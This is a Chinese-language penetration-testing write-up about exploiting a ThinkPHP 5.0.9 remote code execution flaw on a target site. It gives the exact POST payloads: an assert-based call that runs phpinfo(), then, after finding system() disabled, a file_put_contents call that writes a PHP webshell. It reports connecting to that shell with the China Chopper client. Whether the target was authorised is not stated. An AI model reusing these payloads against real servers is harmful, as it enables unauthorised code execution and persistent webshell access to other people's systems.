**信息收集**  
通过信息收集发现是个tp v5.0.9，此版本存在tp-rce漏洞。

![](../Images/183511f99538a48455d4ead2cb19c481.png)

直接通过payload进行测试，

```
Post：\_method=\_\_construct&filter\[\]=assert&method=get&get\[\]=phpinfo()
```

查找payload，直接打：

Post：\_method=\_\_construct&filter\[\]=assert&method=get&get\[\]=phpinfo()

![](../Images/dfe2c374c10606c913deb25ff44b0ae3.png)

发现是php 5.4.45版本的，

直接尝试getshell：

![](../Images/7b3f2519a26f29c94ece180b4a94fa0b.png)

发现system被禁用，尝试其他系统命令的也一样。

![](../Images/df873b227d541e3b5e6d36092b64f8aa.png)

查看phpinfo中desable\_functions禁用了那些函数。

![](../Images/df873b227d541e3b5e6d36092b64f8aa.png)

想办法怎么绕过进行写马（此处卡了我半天）  
最后通过一位渗透小伙伴，想出下面的可以利用file\_put\_contents直接写shell，想了半天，忘了用其他函数进行直接写马就可以了，并不需要非得利用system命令进行写马，还是底层知识薄弱啊。再次感谢小伙伴！

  

**getshell**  
构造payload：

```
\_method=\_\_construct&filter\[\]=assert&method=get&get\[\]=file\_put\_contents('a.php','')
```

![](../Images/3973769f60ef67ea3b0b67b8341b9893.png)

写入成功，利用菜刀连接。

![](../Images/ed53bbe2af1bddf0bf4fea517ac021ef.png)

成功连接。

![](../Images/30152b6bb67429f6c824686d2032c094.png)
